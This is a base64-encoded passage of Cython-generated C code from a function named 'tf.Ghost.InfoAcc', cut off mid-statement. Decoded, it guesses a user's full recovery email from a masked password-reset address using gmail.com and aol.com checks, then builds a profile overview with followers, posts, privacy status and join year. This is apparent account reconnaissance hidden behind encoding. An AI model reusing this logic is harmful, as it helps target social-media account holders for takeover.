iAgICAgIF9fcHl4X3ZfaXNfdmVyaWZpZWQgPSBfX3B5eF90XzE7CiAgICAgIF9fcHl4X3RfMSA9IDA7CgogICAgICAKICAgICAgX19weXhfdF8xID0gX19QeXhfUHlOdW1iZXJfSW50KF9fcHl4X3ZfZm93cyk7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDMxMSwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpOwogICAgICBfX3B5eF90XzcgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8xMCwgUHlfTFQpOyBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNyk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDMxMSwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogICAgICBfX3B5eF90XzkgPSBfX1B5eF9QeU9iamVjdF9Jc1RydWUoX19weXhfdF83KTsgaWYgKHVubGlrZWx5KChfX3B5eF90XzkgPCAwKSkpIF9fUFlYX0VSUigwLCAzMTEsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKICAgICAgaWYgKF9fcHl4X3RfOSkgewoKICAgICAgICAKICAgICAgICBfX3B5eF90XzEgPSBfX3B5eF92X3NlbGY7CiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMSk7CiAgICAgICAgX19weXhfdF8zID0gMDsKICAgICAgICB7CiAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8xLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZmlsdGVyZWR9OwogICAgICAgICAgX19weXhfdF83ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2luY3JlbWVudF9jb3VudGVyLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzMsICgyLV9fcHl4X3RfMykgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDMxMiwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTsKICAgICAgICB9CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CgogICAgICAgIAogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfcik7CiAgICAgICAgX19weXhfciA9IFB5X05vbmU7IF9fUHl4X0lOQ1JFRihQeV9Ob25lKTsKICAgICAgICBnb3RvIF9fcHl4X0w3X3RyeV9yZXR1cm47CgogICAgICAgIAogICAgICB9CgogICAgICAKICAgICAgewogICAgICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZQogICAgICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduCiAgICAgICAgX19QeXhfRXhjZXB0aW9uU2F2ZSgmX19weXhfdF8xMCwgJl9fcHl4X3RfMTEsICZfX3B5eF90XzEyKTsKICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTApOwogICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xMSk7CiAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzEyKTsKICAgICAgICAgewoKICAgICAgICAgIAogICAgICAgICAgX19weXhfdF8xMyA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF92X2Zvd3MpOyBpZiAodW5saWtlbHkoKF9fcHl4X3RfMTMgPCAwKSkpIF9fUFlYX0VSUigwLCAzMTYsIF9fcHl4X0wxMF9lcnJvcikKICAgICAgICAgIGlmIChfX3B5eF90XzEzKSB7CiAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBfX3B5eF90XzkgPSBfX3B5eF90XzEzOwogICAgICAgICAgICBnb3RvIF9fcHl4X0wxN19ib29sX2Jpbm9wX2RvbmU7CiAgICAgICAgICB9CiAgICAgICAgICBfX3B5eF90XzEzID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3ZfcHApOyBpZiAodW5saWtlbHkoKF9fcHl4X3RfMTMgPCAwKSkpIF9fUFlYX0VSUigwLCAzMTYsIF9fcHl4X0wxMF9lcnJvcikKICAgICAgICAgIF9fcHl4X3RfOSA9IF9fcHl4X3RfMTM7CiAgICAgICAgICBfX3B5eF9MMTdfYm9vbF9iaW5vcF9kb25lOjsKICAgICAgICAgIGlmIChfX3B5eF90XzkpIHsKCiAgICAgICAgICAgIAogICAgICAgICAgICBfX3B5eF90XzcgPSBfX1B5eF9QeU51bWJlcl9JbnQoX19weXhfdl9mb3dzKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMzE3LCBfX3B5eF9MMTBfZXJyb3IpCiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogICAgICAgICAgICBfX3B5eF90XzEgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8xMCwgUHlfR0UpOyBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDMxNywgX19weXhfTDEwX2Vycm9yKQogICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKICAgICAgICAgICAgX19weXhfdF8xMyA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzEpOyBpZiAodW5saWtlbHkoKF9fcHl4X3RfMTMgPCAwKSkpIF9fUFlYX0VSUigwLCAzMTcsIF9fcHl4X0wxMF9lcnJvcikKICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7CiAgICAgICAgICAgIGlmIChfX3B5eF90XzEzKSB7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgX19weXhfdF85ID0gX19weXhfdF8xMzsKICAgICAgICAgICAgICBnb3RvIF9fcHl4X0wyMF9ib29sX2Jpbm9wX2RvbmU7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgX19weXhfdF8xID0gX19QeXhfUHlOdW1iZXJfSW50KF9fcHl4X3ZfcHApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAzMTcsIF9fcHl4X0wxMF9lcnJvcikKICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7CiAgICAgICAgICAgIF9fcHl4X3RfNyA9IFB5T2JqZWN0X1JpY2hDb21wYXJlKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIsIFB5X0dFKTsgX19QeXhfWEdPVFJFRihfX3B5eF90XzcpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAzMTcsIF9fcHl4X0wxMF9lcnJvcikKICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7CiAgICAgICAgICAgIF9fcHl4X3RfMTMgPSBfX1B5eF9QeU9iamVjdF9Jc1RydWUoX19weXhfdF83KTsgaWYgKHVubGlrZWx5KChfX3B5eF90XzEzIDwgMCkpKSBfX1BZWF9FUlIoMCwgMzE3LCBfX3B5eF9MMTBfZXJyb3IpCiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgICAgICAgICBfX3B5eF90XzkgPSBfX3B5eF90XzEzOwogICAgICAgICAgICBfX3B5eF9MMjBfYm9vbF9iaW5vcF9kb25lOjsKICAgICAgICAgICAgaWYgKF9fcHl4X3RfOSkgewoKICAgICAgICAgICAgICAKICAgICAgICAgICAgICBfX3B5eF92X21ldGEgPSAxOwoKICAgICAgICAgICAgICAKICAgICAgICAgICAgICBnb3RvIF9fcHl4X0wxOTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgCiAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgX19weXhfdl9tZXRhID0gMDsKICAgICAgICAgICAgfQogICAgICAgICAgICBfX3B5eF9MMTk6OwoKICAgICAgICAgICAgCiAgICAgICAgICAgIGdvdG8gX19weXhfTDE2OwogICAgICAgICAgfQoKICAgICAgICAgIAogICAgICAgICAgIHsKICAgICAgICAgICAgX19weXhfdl9tZXRhID0gMDsKICAgICAgICAgIH0KICAgICAgICAgIF9fcHl4X0wxNjo7CgogICAgICAgICAgCiAgICAgICAgfQogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMik7IF9fcHl4X3RfMTIgPSAwOwogICAgICAgIGdvdG8gX19weXhfTDE1X3RyeV9lbmQ7CiAgICAgICAgX19weXhfTDEwX2Vycm9yOjsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7CgogICAgICAgIAogICAgICAgICB7CiAgICAgICAgICBfX1B5eF9BZGRUcmFjZWJhY2soInRmLkdob3N0LkluZm9BY2MiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTsKICAgICAgICAgIGlmIChfX1B5eF9HZXRFeGNlcHRpb24oJl9fcHl4X3RfNywgJl9fcHl4X3RfMSwgJl9fcHl4X3RfOCkgPCAwKSBfX1BZWF9FUlIoMCwgMzIzLCBfX3B5eF9MMTJfZXhjZXB0X2Vycm9yKQogICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzcpOwogICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzEpOwogICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzgpOwoKICAgICAgICAgIAogICAgICAgICAgX19weXhfdl9tZXRhID0gMDsKICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDsKICAgICAgICAgIGdvdG8gX19weXhfTDExX2V4Y2VwdGlvbl9oYW5kbGVkOwogICAgICAgIH0KCiAgICAgICAgCiAgICAgICAgX19weXhfTDEyX2V4Y2VwdF9lcnJvcjo7CiAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xMCk7CiAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xMSk7CiAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xMik7CiAgICAgICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF8xMCwgX19weXhfdF8xMSwgX19weXhfdF8xMik7CiAgICAgICAgZ290byBfX3B5eF9MM19lcnJvcjsKICAgICAgICBfX3B5eF9MMTFfZXhjZXB0aW9uX2hhbmRsZWQ6OwogICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTApOwogICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTEpOwogICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTIpOwogICAgICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfMTAsIF9fcHl4X3RfMTEsIF9fcHl4X3RfMTIpOwogICAgICAgIF9fcHl4X0wxNV90cnlfZW5kOjsKICAgICAgfQoKICAgICAgCiAgICAgIF9fcHl4X3RfMSA9IF9fcHl4X3Zfc2VsZjsKICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMSk7CiAgICAgIF9fcHl4X3RfMyA9IDA7CiAgICAgIHsKICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8xLCBfX3B5eF92X3VzZXJuYW1lfTsKICAgICAgICBfX3B5eF90XzggPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmVzdCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF8zLCAoMi1fX3B5eF90XzMpIHwgKDEqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDMyNiwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOCk7CiAgICAgIH0KICAgICAgX19weXhfdl9yZXNldF9lbWFpbCA9IF9fcHl4X3RfODsKICAgICAgX19weXhfdF84ID0gMDsKCiAgICAgIAogICAgICBfX3B5eF90XzEgPSBfX3B5eF92X3Jlc2V0X2VtYWlsOwogICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8xKTsKICAgICAgX19weXhfdF8zID0gMDsKICAgICAgewogICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfZ21haWxfY29tfTsKICAgICAgICBfX3B5eF90XzggPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZW5kc3dpdGgsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfMywgKDItX19weXhfdF8zKSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCAzMjgsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpOwogICAgICB9CiAgICAgIF9fcHl4X3RfOSA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzgpOyBpZiAodW5saWtlbHkoKF9fcHl4X3RfOSA8IDApKSkgX19QWVhfRVJSKDAsIDMyOCwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwogICAgICBpZiAoX19weXhfdF85KSB7CgogICAgICAgIAogICAgICAgIF9fcHl4X3RfOCA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF92X3VzZXJuYW1lLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgMzI5LCBfX3B5eF9MM19lcnJvcikKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTsKICAgICAgICBfX3B5eF90XzEgPSBfX1B5eF9QeVVuaWNvZGVfQ29uY2F0SW5QbGFjZShfX3B5eF90XzgsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfZ21haWxfY29tKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMzI5LCBfX3B5eF9MM19lcnJvcikKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDsKICAgICAgICBfX3B5eF92X2VtYWlsID0gKChQeU9iamVjdCopX19weXhfdF8xKTsKICAgICAgICBfX3B5eF90XzEgPSAwOwoKICAgICAgICAKICAgICAgICBnb3RvIF9fcHl4X0wyNDsKICAgICAgfQoKICAgICAgCiAgICAgIF9fcHl4X3RfOCA9IF9fcHl4X3ZfcmVzZXRfZW1haWw7CiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzgpOwogICAgICBfX3B5eF90XzMgPSAwOwogICAgICB7CiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfOCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9hb2xfY29tfTsKICAgICAgICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZW5kc3dpdGgsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfMywgKDItX19weXhfdF8zKSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDsKICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAzMzAsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpOwogICAgICB9CiAgICAgIF9fcHl4X3RfOSA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzEpOyBpZiAodW5saWtlbHkoKF9fcHl4X3RfOSA8IDApKSkgX19QWVhfRVJSKDAsIDMzMCwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogICAgICBpZiAoX19weXhfdF85KSB7CgogICAgICAgIAogICAgICAgIF9fcHl4X3RfMSA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF92X3VzZXJuYW1lLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMzMxLCBfX3B5eF9MM19lcnJvcikKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTsKICAgICAgICBfX3B5eF90XzggPSBfX1B5eF9QeVVuaWNvZGVfQ29uY2F0SW5QbGFjZShfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfYW9sX2NvbSk7IGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDMzMSwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOCk7CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7CiAgICAgICAgX19weXhfdl9lbWFpbCA9ICgoUHlPYmplY3QqKV9fcHl4X3RfOCk7CiAgICAgICAgX19weXhfdF84ID0gMDsKCiAgICAgICAgCiAgICAgICAgZ290byBfX3B5eF9MMjQ7CiAgICAgIH0KCiAgICAgIAogICAgICAgewogICAgICAgIF9fcHl4X3RfOCA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF92X3VzZXJuYW1lLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgMzMzLCBfX3B5eF9MM19lcnJvcikKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTsKICAgICAgICBfX3B5eF90XzEgPSBfX1B5eF9QeVVuaWNvZGVfQ29uY2F0SW5QbGFjZShfX3B5eF90XzgsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfdW5rbm93bl9jb20pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAzMzMsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwogICAgICAgIF9fcHl4X3ZfZW1haWwgPSAoKFB5T2JqZWN0KilfX3B5eF90XzEpOwogICAgICAgIF9fcHl4X3RfMSA9IDA7CiAgICAgIH0KICAgICAgX19weXhfTDI0OjsKCiAgICAgIAogICAgICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdl9mdWxsX25hbWUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAzMzUsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTsKICAgICAgX19weXhfdF84ID0gX19QeXhfUHlPYmplY3RfRm9ybWF0U2ltcGxlKF9fcHl4X3ZfdXNlcm5hbWUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCAzMzUsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTsKICAgICAgX19weXhfdF83ID0gX19QeXhfUHlPYmplY3RfRm9ybWF0U2ltcGxlKF9fcHl4X3ZfZm93cywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDMzNSwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogICAgICBfX3B5eF90XzIgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdl9mb3dnLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMzM1LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7CiAgICAgIF9fcHl4X3RfMTQgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdl9wcCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xNCkpIF9fUFlYX0VSUigwLCAzMzUsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xNCk7CiAgICAgIF9fcHl4X3RfMTUgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdl9pc1ByYWlzZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xNSkpIF9fUFlYX0VSUigwLCAzMzUsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xNSk7CiAgICAgIF9fcHl4X3RfMTYgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3Zfc2VsZiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2RhdGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTYpKSBfX1BZWF9FUlIoMCwgMzM1LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTYpOwogICAgICBfX3B5eF90XzE3ID0gX19QeXhfUHlPYmplY3RfQ2FsbE9uZUFyZyhfX3B5eF90XzE2LCBfX3B5eF92X0lkKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE3KSkgX19QWVhfRVJSKDAsIDMzNSwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE3KTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTYpOyBfX3B5eF90XzE2ID0gMDsKICAgICAgX19weXhfdF8xNiA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF90XzE3LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE2KSkgX19QWVhfRVJSKDAsIDMzNSwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE2KTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTcpOyBfX3B5eF90XzE3ID0gMDsKICAgICAgX19weXhfdF8xNyA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF92X3Jlc2V0X2VtYWlsLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE3KSkgX19QWVhfRVJSKDAsIDMzNSwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE3KTsKICAgICAgX19weXhfdF8xOCA9IF9fUHl4X1B5VW5pY29kZV9Gcm9tQkludF9iaW50KF9fcHl4X3ZfbWV0YSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xOCkpIF9fUFlYX0VSUigwLCAzMzUsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xOCk7CiAgICAgIF9fcHl4X3RfMTkgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdl91c2VybmFtZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xOSkpIF9fUFlYX0VSUigwLCAzMzUsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xOSk7CiAgICAgIF9fcHl4X3RfMjBbMF0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X1BST0ZJTEVfT1ZFUlZJRVdfTmFtZTsKICAgICAgX19weXhfdF8yMFsxXSA9IF9fcHl4X3RfMTsKICAgICAgX19weXhfdF8yMFsyXSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfVXNlcm5hbWU7CiAgICAgIF9fcHl4X3RfMjBbM10gPSBfX3B5eF90Xzg7CiAgICAgIF9fcHl4X3RfMjBbNF0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X0VtYWlsOwogICAgICBfX3B5eF90XzIwWzVdID0gX19weXhfdl9lbWFpbDsKICAgICAgX19weXhfdF8yMFs2XSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfRm9sbG93ZXJzOwogICAgICBfX3B5eF90XzIwWzddID0gX19weXhfdF83OwogICAgICBfX3B5eF90XzIwWzhdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9Gb2xsb3dpbmc7CiAgICAgIF9fcHl4X3RfMjBbOV0gPSBfX3B5eF90XzI7CiAgICAgIF9fcHl4X3RfMjBbMTBdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9Qb3N0czsKICAgICAgX19weXhfdF8yMFsxMV0gPSBfX3B5eF90XzE0OwogICAgICBfX3B5eF90XzIwWzEyXSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfUHJpdmF0ZTsKICAgICAgX19weXhfdF8yMFsxM10gPSBfX3B5eF90XzE1OwogICAgICBfX3B5eF90XzIwWzE0XSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfSm9pbmVkX1llYXI7CiAgICAgIF9fcHl4X3RfMjBbMTVdID0g